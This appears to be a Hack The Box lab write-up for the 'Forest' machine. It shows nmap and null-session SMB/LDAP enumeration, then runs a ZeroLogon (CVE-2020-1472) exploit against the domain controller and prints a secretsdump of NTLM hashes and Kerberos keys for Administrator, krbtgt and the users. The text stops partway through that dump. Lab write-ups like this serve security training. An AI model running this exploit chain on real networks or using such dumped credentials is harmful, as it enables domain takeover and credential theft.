---
{"dg-publish":true,"permalink":"/ct-fs/htb/forest/","dgShowFileTree":true,"dg-note-properties":{}}
---


#windows #smb #nxc #zerologon #unauthenticated #null_session

## Recon
![Forest.png.png](/img/user/CTFs/HTB/Images/Forest.png.png)

### Nmap:
```zsh
nmap -p53,88,135,389,445,464,593,636,3269,3268,5985,9389,47001,49664,49666,49668,49671,49685,49665,49680,49681,49697,49857 -sV -sC -T4 -Pn -oA 10.129.95.210 10.129.95.210
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-07 15:08 -0400
Nmap scan report for 10.129.95.210
Host is up (0.097s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-10-07 19:14:24Z)
135/tcp   open  msrpc        Microsoft Windows RPC
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc        Microsoft Windows RPC
49685/tcp open  msrpc        Microsoft Windows RPC
49697/tcp open  msrpc        Microsoft Windows RPC
49857/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-10-07T19:15:14
|_  start_date: 2026-10-07T18:54:40
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-10-07T12:15:18-07:00
|_clock-skew: mean: 2h25m22s, deviation: 4h02m32s, median: 5m20s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.07 seconds

```
Initial port scanning shows a typical suite of windows ports including kerberos, smb, ldap, HTTPAPI, msrpc, and DNS. We also note that the server is running Windows Server 2016 Standard 6.3 under the host name `FOREST.htb.local`. Adding to our hosts file.
### Port 445 (SMB)
#### NXC
##### Shares
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc smb FOREST.htb.local -u '' -p '' --shares   
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
SMB         10.129.95.210   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc smb FOREST.htb.local -u 'Guest' -p '' --shares
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [-] htb.local\Guest: STATUS_ACCOUNT_DISABLED 
```
We test for Null and Guest access and discover we do have null access but do not have permission to view any shares.
##### Users
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc smb FOREST.htb.local -u '' -p '' --users      
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
SMB         10.129.95.210   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.95.210   445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain 
SMB         10.129.95.210   445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.95.210   445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account 
SMB         10.129.95.210   445    FOREST           DefaultAccount                <never>             0       A user account managed by the system. 
SMB         10.129.95.210   445    FOREST           $331000-VK4ADACQNUCA          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_2c8eef0a09b545acb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_75a538d3025e4db9a          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_681f53d4942840e18          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1b41c9286325456bb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_9b69f1b9d2cc45549          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_7c96b981967141ebb          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_c75ee099d0a64c91b          <never>             0        
SMB         10.129.95.210   445    FOREST           SM_1ffab36a2f5f479cb          <never>             0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0        
SMB         10.129.95.210   445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0        
SMB         10.129.95.210   445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0        
SMB         10.129.95.210   445    FOREST           sebastien                     2019-09-20 00:29:59 0        
SMB         10.129.95.210   445    FOREST           lucinda                       2019-09-20 00:44:13 0        
SMB         10.129.95.210   445    FOREST           svc-alfresco                  2026-10-07 19:19:35 0        
SMB         10.129.95.210   445    FOREST           andy                          2019-09-22 22:44:16 0        
SMB         10.129.95.210   445    FOREST           mark                          2019-09-20 22:57:30 0        
SMB         10.129.95.210   445    FOREST           santi                         2019-09-20 23:02:55 0
```
We successfully use our Null access to pull a list of valid users on the system.
##### Groups
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc ldap FOREST.htb.local -u '' -p '' --groups
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.210   389    FOREST           [+] htb.local\: 
LDAP        10.129.95.210   389    FOREST           -Group-                                  -Members- -Description-                                               
LDAP        10.129.95.210   389    FOREST           Administrators                           3         Administrators have complete and unrestricted access to the computer/domain
LDAP        10.129.95.210   389    FOREST           Users                                    3         Users are prevented from making accidental or intentional system-wide changes and can run most applications
LDAP        10.129.95.210   389    FOREST           Guests                                   2         Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
LDAP        10.129.95.210   389    FOREST           Print Operators                          0         Members can administer printers installed on domain controllers
LDAP        10.129.95.210   389    FOREST           Backup Operators                         0         Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
LDAP        10.129.95.210   389    FOREST           Replicator                               0         Supports file replication in a domain
LDAP        10.129.95.210   389    FOREST           Remote Desktop Users                     0         Members in this group are granted the right to logon remotely
LDAP        10.129.95.210   389    FOREST           Network Configuration Operators          0         Members in this group can have some administrative privileges to manage configuration of networking features
LDAP        10.129.95.210   389    FOREST           Performance Monitor Users                0         Members of this group can access performance counter data locally and remotely
LDAP        10.129.95.210   389    FOREST           Performance Log Users                    0         Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
LDAP        10.129.95.210   389    FOREST           Distributed COM Users                    0         Members are allowed to launch, activate and use Distributed COM objects on this machine.
LDAP        10.129.95.210   389    FOREST           IIS_IUSRS                                1         Built-in group used by Internet Information Services.
LDAP        10.129.95.210   389    FOREST           Cryptographic Operators                  0         Members are authorized to perform cryptographic operations.
LDAP        10.129.95.210   389    FOREST           Event Log Readers                        0         Members of this group can read event logs from local machine
LDAP        10.129.95.210   389    FOREST           Certificate Service DCOM Access          0         Members of this group are allowed to connect to Certification Authorities in the enterprise
LDAP        10.129.95.210   389    FOREST           RDS Remote Access Servers                0         Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.
LDAP        10.129.95.210   389    FOREST           RDS Endpoint Servers                     0         Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.
LDAP        10.129.95.210   389    FOREST           RDS Management Servers                   0         Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.
LDAP        10.129.95.210   389    FOREST           Hyper-V Administrators                   0         Members of this group have complete and unrestricted access to all features of Hyper-V.
LDAP        10.129.95.210   389    FOREST           Access Control Assistance Operators      0         Members of this group can remotely query authorization attributes and permissions for resources on this computer.
LDAP        10.129.95.210   389    FOREST           Remote Management Users                  1         Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
LDAP        10.129.95.210   389    FOREST           System Managed Accounts Group            1         Members of this group are managed by the system.
LDAP        10.129.95.210   389    FOREST           Storage Replica Administrators           0         Members of this group have complete and unrestricted access to all features of Storage Replica.
LDAP        10.129.95.210   389    FOREST           Domain Computers                         0         All workstations and servers joined to the domain
LDAP        10.129.95.210   389    FOREST           Domain Controllers                       0         All domain controllers in the domain
LDAP        10.129.95.210   389    FOREST           Schema Admins                            1         Designated administrators of the schema
LDAP        10.129.95.210   389    FOREST           Enterprise Admins                        1         Designated administrators of the enterprise
LDAP        10.129.95.210   389    FOREST           Cert Publishers                          0         Members of this group are permitted to publish certificates to the directory
LDAP        10.129.95.210   389    FOREST           Domain Admins                            1         Designated administrators of the domain
LDAP        10.129.95.210   389    FOREST           Domain Users                             0         All domain users
LDAP        10.129.95.210   389    FOREST           Domain Guests                            0         All domain guests
LDAP        10.129.95.210   389    FOREST           Group Policy Creator Owners              1         Members in this group can modify group policy for the domain
LDAP        10.129.95.210   389    FOREST           RAS and IAS Servers                      0         Servers in this group can access remote access properties of users
LDAP        10.129.95.210   389    FOREST           Server Operators                         0         Members can administer domain servers
LDAP        10.129.95.210   389    FOREST           Account Operators                        1         Members can administer domain user and group accounts
LDAP        10.129.95.210   389    FOREST           Pre-Windows 2000 Compatible Access       2         A backward compatibility group which allows read access on all users and groups in the domain
LDAP        10.129.95.210   389    FOREST           Incoming Forest Trust Builders           0         Members of this group can create incoming, one-way trusts to this forest
LDAP        10.129.95.210   389    FOREST           Windows Authorization Access Group       2         Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
LDAP        10.129.95.210   389    FOREST           Terminal Server License Servers          0         Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
LDAP        10.129.95.210   389    FOREST           Allowed RODC Password Replication Group  0         Members in this group can have their passwords replicated to all read-only domain controllers in the domain
LDAP        10.129.95.210   389    FOREST           Denied RODC Password Replication Group   8         Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
LDAP        10.129.95.210   389    FOREST           Read-only Domain Controllers             0         Members of this group are Read-Only Domain Controllers in the domain
LDAP        10.129.95.210   389    FOREST           Enterprise Read-only Domain Controllers  0         Members of this group are Read-Only Domain Controllers in the enterprise
LDAP        10.129.95.210   389    FOREST           Cloneable Domain Controllers             0         Members of this group that are domain controllers may be cloned.
LDAP        10.129.95.210   389    FOREST           Protected Users                          0         Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
LDAP        10.129.95.210   389    FOREST           Key Admins                               0         Members of this group can perform administrative actions on key objects within the domain.
LDAP        10.129.95.210   389    FOREST           Enterprise Key Admins                    0         Members of this group can perform administrative actions on key objects within the forest.
LDAP        10.129.95.210   389    FOREST           DnsAdmins                                0         DNS Administrators Group
LDAP        10.129.95.210   389    FOREST           DnsUpdateProxy                           0         DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
LDAP        10.129.95.210   389    FOREST           Organization Management                  1         Members of this management role group have permissions to manage Exchange objects and their properties in the Exchange organization. Members can also delegate role groups and management roles in the organization. This role group shouldn't be deleted.
LDAP        10.129.95.210   389    FOREST           Recipient Management                     0         Members of this management role group have rights to create, manage, and remove Exchange recipient objects in the Exchange organization.
LDAP        10.129.95.210   389    FOREST           View-Only Organization Management        0         Members of this management role group can view recipient and configuration objects and their properties in the Exchange organization.
LDAP        10.129.95.210   389    FOREST           Public Folder Management                 0         Members of this management role group can manage public folders. Members can create and delete public folders and manage public folder settings such as replicas, quotas, age limits, and permissions as well as mail-enable and mail-disable public folders.
LDAP        10.129.95.210   389    FOREST           UM Management                            0         Members of this management role group can manage Unified Messaging organization, server, and recipient configuration.
LDAP        10.129.95.210   389    FOREST           Help Desk                                0         Members of this management role group can view and manage the configuration for individual recipients and view recipients in an Exchange organization. Members of this role group can only manage the configuration each user can manage on his or her own mailbox. Additional  permissions can be added by assigning additional management roles to this role group.
LDAP        10.129.95.210   389    FOREST           Records Management                       0         Members of this management role group can configure compliance features such as retention policy tags, message classifications, transport rules, and more.
LDAP        10.129.95.210   389    FOREST           Discovery Management                     0         Members of this management role group can perform searches of mailboxes in the Exchange organization for data that meets specific criteria.
LDAP        10.129.95.210   389    FOREST           Server Management                        0         Members of this management role group have permissions to manage all Exchange servers within the Exchange organization, but members don't have permissions to perform operations that have global impact in the Exchange organization.
LDAP        10.129.95.210   389    FOREST           Delegated Setup                          0         Members of this management role group have permissions to install and uninstall Exchange on provisioned servers. This role group shouldn't be deleted.
LDAP        10.129.95.210   389    FOREST           Hygiene Management                       0         Members of this management role group can manage Exchange anti-spam features and grant permissions for antivirus products to integrate with Exchange.
LDAP        10.129.95.210   389    FOREST           Compliance Management                    0         This role group will allow a specified user, responsible for compliance, to properly configure and manage compliance settings within Exchange in accordance with their policy.
LDAP        10.129.95.210   389    FOREST           Security Reader                          0         Membership in this role group is synchronized across services and managed centrally. This role group is not manageable through the administrator portals. Members of this role group may include cross-service administrators, as well as external partner groups and Microsoft Support. By default, this group may not be assigned any roles. However, it will be a member of the Security Reader role groups and will inherit the capabilities of that role group.
LDAP        10.129.95.210   389    FOREST           Security Administrator                   0         Membership in this role group is synchronized across services and managed centrally. This role group is not manageable through the administrator portals. Members of this role group may include cross-service administrators, as well as external partner groups and Microsoft Support. By default, this group may not be assigned any roles. However, it will be a member of the Security Administrators role groups and will inherit the capabilities of that role group.
LDAP        10.129.95.210   389    FOREST           Exchange Servers                         2         This group contains all the Exchange servers. This group shouldn't be deleted.
LDAP        10.129.95.210   389    FOREST           Exchange Trusted Subsystem               1         This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Exchange configuration, as well as user accounts and groups. This group should not be deleted.
LDAP        10.129.95.210   389    FOREST           Managed Availability Servers             2         This group contains all the Managed Availability servers. This group shouldn't be deleted.
LDAP        10.129.95.210   389    FOREST           Exchange Windows Permissions             1         This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.
LDAP        10.129.95.210   389    FOREST           ExchangeLegacyInterop                    0         This group is for interoperability with Exchange 2003 servers within the same forest. This group should not be deleted.
LDAP        10.129.95.210   389    FOREST           Exchange Install Domain Servers          1         This group is used during Exchange setup and is not intended to be used for other purposes.
LDAP        10.129.95.210   389    FOREST           Service Accounts                         1         
LDAP        10.129.95.210   389    FOREST           Privileged IT Accounts                   1         
LDAP        10.129.95.210   389    FOREST           test                                     0         
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc ldap FOREST.htb.local -u '' -p '' --groups test
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.210   389    FOREST           [+] htb.local\: 
LDAP        10.129.95.210   389    FOREST           [-] Group 'test' has no members
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc ldap FOREST.htb.local -u '' -p '' --groups 'Privileged IT Accounts'
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.210   389    FOREST           [+] htb.local\: 
LDAP        10.129.95.210   389    FOREST           Service Accounts
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc ldap FOREST.htb.local -u '' -p '' --groups 'Service Accounts'      
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.210   389    FOREST           [+] htb.local\: 
LDAP        10.129.95.210   389    FOREST           svc-alfresco
                                                                                                                                                                                                                                             
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc ldap FOREST.htb.local -u '' -p '' --groups 'Remote Management Users'
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.95.210   389    FOREST           [+] htb.local\: 
LDAP        10.129.95.210   389    FOREST           Privileged IT Accounts

```
Enumerating domain groups we see a few interesting groups: test, Privileged IT Accounts, and of course Remote Management Users. What we found is that they are nested. Privileged IT Accounts has a single member: the Service Accounts group which also has a single member: the user `svc-alfresco`. Also Remote Management Users also has one member which is the Privileged IT Accounts group. Therefore, all groups only contain that one service account. This looks like a valid target for our initial access.

## Initial Access & Privilege Escalation
### ZeroLogon
#### Exploit Steps
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/forest/scanning]
└─$ nxc smb FOREST.htb.local -u '' -p '' -M zerologon
/usr/lib/python3/dist-packages/lsassy/impacketfile.py:90: SyntaxWarning: 'return' in a 'finally' block
  return True
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\: 
ZEROLOGON   10.129.95.210   445    FOREST           VULNERABLE
ZEROLOGON   10.129.95.210   445    FOREST           Next step: https://github.com/dirkjanm/CVE-2020-1472


┌──(kali㉿kali)-[~/…/forest/exploit/zerologon/CVE-2020-1472]
└─$ python3 cve-2020-1472-exploit.py FOREST 10.129.95.210                        
Performing authentication attempts...
===================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete
```
We successfully enumerated this server is vulnerable to `zerologon` which is a vulnerability that allows us to reset the machine account password of the server to all zeroes. We successfully exploit the target.
##### Loot
```zsh
┌──(kali㉿kali)-[~/…/forest/exploit/zerologon/CVE-2020-1472]
└─$ impacket-secretsdump -dc-ip 10.129.117.125 -just-dc -no-pass 'FOREST$'@10.129.95.210 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
